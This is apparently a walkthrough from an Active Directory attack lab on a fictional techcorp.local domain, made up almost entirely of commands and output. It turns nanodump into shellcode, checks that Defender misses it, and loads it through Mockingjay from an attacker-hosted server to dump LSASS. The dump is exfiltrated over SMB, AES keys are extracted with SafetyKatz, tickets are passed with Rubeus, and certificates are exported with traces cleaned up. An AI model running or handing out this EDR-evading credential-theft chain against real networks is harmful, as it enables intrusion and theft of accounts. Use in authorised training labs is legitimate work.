PS C:\AD\Tools> C:\AD\Tools\mockingjay\donut.exe -f 1 -p " -sc -f --write nano.dmp" -i C:\AD\Tools\mockingjay\nanodump.x64.exe -o C:\AD\Tools\mockingjay\nano.bin

  [ Donut shellcode generator v1 (built Mar  3 2023 13:33:22)
  [ Copyright (c) 2019-2021 TheWover, Odzhan

  [ Instance type : Embedded
  [ Module file   : "C:\AD\Tools\mockingjay\nanodump.x64.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : EXE
  [ Parameters    :  -sc -f --write nano.dmp
  [ Target CPU    : x86+amd64
  [ AMSI/WDLP/ETW : continue
  [ PE Headers    : overwrite
  [ Shellcode     : "C:\AD\Tools\mockingjay\nano.bin"
  [ Exit          : Thread
```

Confirm that the mockingjay POC and `nano.bin` shellcode is undetected by AV using AmsiTrigger/DefenderCheck.

```
PS C:\AD\Tools> C:\AD\Tools\DefenderCheck.exe C:\AD\Tools\mockingjay\mockingjay.exe

[+] No threat found in submitted file!

PS C:\AD\Tools> C:\AD\Tools\DefenderCheck.exe C:\AD\Tools\mockingjay\nano.bin

[+] No threat found in submitted file!
```

Now host `mockingjay.zip` and `nano.bin` on our student VM using HFS.
Make sure firewall is disabled before doing so.

From the process running with privileges of `jumpone`, connect to `us-jump3` and then download `mockingjay.zip` using `msedge.exe`.

```
PS C:\Windows\system32> winrs -r:us-jump3 cmd

Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\jumpone$>
🚀

C:\Users\jumpone$>set u

USERDNSDOMAIN=US.TECHCORP.LOCAL
USERDOMAIN=US
USERNAME=jumpone$ 👤
USERPROFILE=C:\Users\jumpone$
```

⚠️ Note that using commonly abused binaries such as certutil for downloads, will result in a detection on MDE.

Wait a few seconds for the download to complete.

```
C:\Users\jumpone$>cd Downloads

C:\Users\jumpone$\Downloads>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --incognito http://192.168.100.51/mockingjay.zip

C:\Users\jumpone$\Downloads>[4900:3916:0429/072527.219:ERROR:os_crypt_win.cc(87)] Failed to encrypt: The requested operation cannot be completed. The computer must be trusted for delegation and the current user account must be configured to allow delegation. (0x80090345)
[4900:3916:0429/072528.210:ERROR:policy_logger.cc(156)] :components\enterprise\browser\controller\chrome_browser_cloud_management_controller.cc(161) Cloud management controller initialization aborted as CBCM is not enabled. Please use the `--enable-chrome-browser-cloud-management` command line flag to enable it if you are not using the official Google Chrome build.
[4900:2636:0429/072528.585:ERROR:login_database_async_helper.cc(213)] Encryption is not available.
[4900:3916:0429/072529.445:ERROR:edge_auth_errors.cc(514)] EDGE_IDENTITY: Get Default OS Account failed: Error: Primary Error: kImplicitSignInFailure, Secondary Error: kAccountProviderFetchError, Platform error: -2147023584, hex:80070520, Error string:

[4900:3916:0429/072529.616:ERROR:download_status_updater_win.cc(34)] Failed initializing an ITaskbarList3 interface.

[SNIP]

C:\Users\jumpone$\Downloads>dir

[SNIP]

 Directory of C:\Users\jumpone$\Downloads

04/29/2025  07:25 AM    <DIR>          .
04/29/2025  07:25 AM    <DIR>          ..
04/29/2025  07:25 AM         4,486,554 mockingjay.zip
               1 File(s)      4,486,554 bytes
               2 Dir(s)  12,295,819,264 bytes free
```

Now extract the contents from the `mockingjay.zip` archive using tar and attempt to perform an LSASS dump invoking the `nano.bin` shellcode hosted on our student VM webserver.

```
C:\Users\jumpone$\Downloads>tar -xf C:\Users\jumpone$\Downloads\mockingjay.zip

C:\Users\jumpone$\Downloads>C:\Users\jumpone$\Downloads\mockingjay.exe 192.168.100.51 "/nano.bin"

[SNIP]

The minidump has an invalid signature, restore it running:
scripts/restore_signature nano.dmp 📌
Done, to get the secretz run:
python3 -m pypykatz lsa minidump nano.dmp
mimikatz.exe "sekurlsa::minidump nano.dmp" "sekurlsa::logonPasswords full" exit
[+] Module loaded...
[+] Offset to RWX memory region: 0xd271b000
[+] Shellcode Written to RWX Memory Region.
```

⭐ An LSASS dump file is written called `nano.dmp` with an invalid signature since a normal LSASS dump on disk could trigger an MDE detection. We will now exfiltrate this dump file, restore and parse it for credentials.

Before doing so exit out of the winrs session and perform exfiltration using SMB along with a clean-up of all files used on the target.

```
C:\Users\jumpone$\Downloads>exit

PS C:\AD\Tools\mockingjay> copy \\us-jump3.US.TECHCORP.LOCAL\c$\users\jumpone$\Downloads\nano.dmp C:\AD\Tools\mockingjay

PS C:\AD\Tools\mockingjay> del \\us-jump3.US.TECHCORP.LOCAL\c$\Users\jumpone$\Downloads\*
```

Finally, restore the exfiltrated dump signature and parse credentials using mimikatz as follows.

```
PS C:\AD\Tools\mockingjay> C:\AD\Tools\mockingjay\restore_signature.exe C:\AD\Tools\mockingjay\nano.dmp

done, to analize the dump run:
python3 -m pypykatz lsa minidump C:\AD\Tools\mockingjay\nano.dmp
```

Extract credentials from the dump file.

```
C:\Windows\system32> echo "%Pwn1%

sekurlsa::minidump

C:\Windows\system32> echo "%Pwn2%

sekurlsa::keys

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn1% C:\AD\Tools\mockingjay\nano.dmp" "%Pwn2%" "exit"

[SNIP]

mimikatz(commandline) # sekurlsa::minidump C:\AD\Tools\mockingjay\nano.dmp
Switch to MINIDUMP : 'C:\AD\Tools\mockingjay\nano.dmp'

mimikatz(commandline) # sekurlsa::keys
Opening : 'C:\AD\Tools\mockingjay\nano.dmp' file for minidump...

[SNIP]

Authentication Id : 0 ; 1256264 (00000000:00132b48)
Session           : RemoteInteractive from 2
User Name         : pawadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 8/4/2024 9:47:25 PM
SID               : S-1-5-21-210670787-2521448726-163245708-1138

         * Username : pawadmin 👤
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30 🔑

[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : US-JUMP3$
Domain            : US
Logon Server      : (null)
Logon Time        : 7/8/2024 6:14:07 AM
SID               : S-1-5-18

         * Username : us-jump3$ 👤
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       2b7938cb10514b587c42c0748a0be8f79d6ab3b280b5e2e78f8cdc3b4be48a5b 🔑

[SNIP]

Authentication Id : 0 ; 623005 (00000000:0009819d)
Session           : Service from 0
User Name         : appsvc
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/8/2024 6:16:10 AM
SID               : S-1-5-21-210670787-2521448726-163245708-4601

         * Username : appsvc 👤
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 🔑

[SNIP]
```

On `us-jump3`, we can check for certificates that can be used later.

Spawn a process with the privileges of `pawadmin`.

```
C:\Windows\system32> echo %Pwn%

asktgt

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:pawadmin /domain:us.techcorp.local /aes256:a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

[SNIP]

[*] Action: Ask TGT

[SNIP]

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  pawadmin
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  4/27/2025 10:57:13 AM
  EndTime                  :  4/27/2025 8:57:13 PM
  RenewTill                :  5/4/2025 10:57:13 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  HX8hwjB0y9ZVnwtJrDdN4qhFqmokLM2sZ0y6avf0LtY=
  ASREP (key)              :  A92324F21AF51EA2891A24E9D5C3AE9DD2AE09B88EF6A88CB292575D16063C30
```

Run the below commands in the new process to enumerate the LocalMachine certificate store.

```
C:\Windows\system32> winrs -r:us-jump3 cmd

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\pawadmin>
🚀

C:\Users\pawadmin>certutil -store My

My "Personal"
================ Certificate 0 ================
Serial Number: 770000002b1e67d3cc43fe175100010000002b 📌
Issuer: CN=TECHCORP-DC-CA, DC=techcorp, DC=local
 NotBefore: 8/4/2024 9:49 PM
 NotAfter: 8/4/2025 9:49 PM
Subject: E=pawadmin@techcorp.local, CN=pawadmin, CN=Users, DC=us, DC=techcorp, DC=local
Non-root Certificate

[SNIP]
```

We can now export this certificate in a PFX format as follows.

```
C:\Users\pawadmin>certutil -exportpfx -p P@ssw0rd1! 770000002b1e67d3cc43fe175100010000002b C:\Users\pawadmin\Downloads\pawadmin.pfx

[SNIP]

CertUtil: -exportPFX command completed successfully.
```

Disconnect from the winrs session and exfiltrate the certificate back onto our student VM. Be sure to perform a clean-up after.

```
C:\Users\pawadmin>exit

C:\AD\Tools> copy \\us-jump3.US.TECHCORP.LOCAL\c$\Users\pawadmin\Downloads\pawadmin.pfx C:\AD\Tools\

[SNIP]

C:\AD\Tools> del \\us-jump3.US.TECHCORP.LOCAL\c$\Users\pawadmin\Downloads\*
```

We will use this certificate later.

**Credentials Extraction – Generates events in MDE**

Let's look at some of the steps that will be detected by MDE.

⭐ We can use the following command to extract credentials from LSASS using `rundll32.exe`. Both `rundll32.exe` and `comsvcs.dll` are Microsoft signed. We are creating a memory dump of the LSASS process and we will parse it offline on the student VM.

⚠️ Since the `comsvcs.dll` based memory dump is detected by Defender we will need to disable Defender by executing `Set-MpPreference -DisableRealtimeMonitoring $true` command.
Note that because of MDE `Set-MpPreference` would fail.

Run the below commands from a process running as `jumpone`.

Note that '720' in the below command is the PID of `lsass.exe` process.

```
PS C:\Windows\system32> winrs -r:us-jump3 cmd

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\jumpone$>
🚀

C:\Users\jumpone$>set u

USERDNSDOMAIN=US.TECHCORP.LOCAL
USERDOMAIN=US
USERDOMAIN_ROAMINGPROFILE=US
USERNAME=jumpone$ 👤
USERPROFILE=C:\Users\jumpone$
```

```
C:\Users\jumpone$>tasklist /FI "IMAGENAME eq lsass.exe"

Image Name                     PID  Session Name        Session#    Mem Usage
========================= ========  ================ =========== ============
lsass.exe                      720 📌 Services                   0     22,704 K

C:\Users\jumpone$>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 720 C:\Users\Public\lsass.dmp full

Access is denied.
❌
```

⚠️ Note that the above command fails and will result in a detection in MDE.
⚠️ Note that if we try to extract certificates using PowerShell, that is also flagged by MDE.

Start a process as `pawadmin` using `asktgt` and run the following commands.

```
PS C:\Windows\system32> winrs -r:us-jump3 cmd

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\pawadmin>
🚀

C:\Users\pawadmin>set u

USERDNSDOMAIN=US.TECHCORP.LOCAL
USERDOMAIN=US
USERDOMAIN_ROAMINGPROFILE=US
USERNAME=pawadmin 👤
USERPROFILE=C:\Users\pawadmin
```

```
C:\Users\pawadmin>powershell

PS C:\Users\pawadmin> ls cert:\LocalMachine\My

   PSParentPath: Microsoft.PowerShell.Security\Certificate::LocalMachine\My

Thumbprint                                   Subject
----------                                   -------
5FA4181469C12D2DFF98E3E5EB490B60284FE3AC 📌  E=pawadmin@techcorp.local, CN=pawadmin, CN=Users, DC=us, DC=techcorp, DC=l...

PS C:\Users\pawadmin> ls cert:\LocalMachine\My\5FA4181469C12D2DFF98E3E5EB490B60284FE3AC | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'P@ssw0rd1!' -Force -AsPlainText)

    Directory: C:\Users\Public

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/27/2025  11:02 AM           4847 pawadmin.pfx 📜
```

---
---
